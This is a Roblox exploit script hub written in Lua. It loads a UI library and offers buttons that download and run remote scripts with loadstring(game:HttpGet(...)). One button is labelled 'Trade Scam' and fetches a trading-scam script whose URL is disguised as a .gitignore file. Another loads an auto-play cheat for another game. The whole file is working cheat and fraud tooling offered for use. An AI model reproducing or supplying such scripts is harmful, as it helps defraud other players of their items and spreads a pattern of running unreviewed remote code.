-- Load Kavo UI Library with Error Handling
local success, Library = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua", true))()
end)

if not success then
    warn("Failed to load Kavo UI Library. Check your internet or executor.")
    return
end

-- Create Main UI Window
local Window = Library.CreateLib("Universal Aizen", "Sentinel") -- Renamed Aizen to Universal Aizen

-- Main Tab
local MainTab = Window:NewTab("Main")
local MainSection = MainTab:NewSection("Universal Aizen Scripts")

MainSection:NewLabel("Welcome to Universal Aizen!")

-- **Pop It Trading Script**
MainSection:NewButton("Pop It Trading", "Trade Scam", function()
    local popit_success, popit_err = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Cooked-METHods/pop-it-trading-scam-script/main/.gitignore", true))()
    end)

    if popit_success then
        print("Pop It Trading script executed!")
    else
        warn("Pop It Trading script failed to load:", popit_err)
    end
end)

-- **Blue Lock Rivals Script**
MainSection:NewButton("Blue Lock Rivals", "Auto play script", function()
    local bluelock_success, bluelock_err = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/game/main/TbaoHubBlueLockRivals", true))()
    end)

    if bluelock_success then
        print("Blue Lock Rivals script executed!")
    else
        warn("Blue Lock Rivals script failed to load:", bluelock_err)
    end
end)

-- **Make GUI Draggable on Mobile & Keyboard Move on PC**
local UserInputService = game:GetService("UserInputService")
if UserInputService.TouchEnabled then
    print("Running on Mobile - UI is draggable by touch!")
else
    print("Running on PC - UI is controlled by keyboard!")
end

-- Auto-draggable UI
Library:ToggleUI()

print("Universal Aizen Loaded Successfully!")
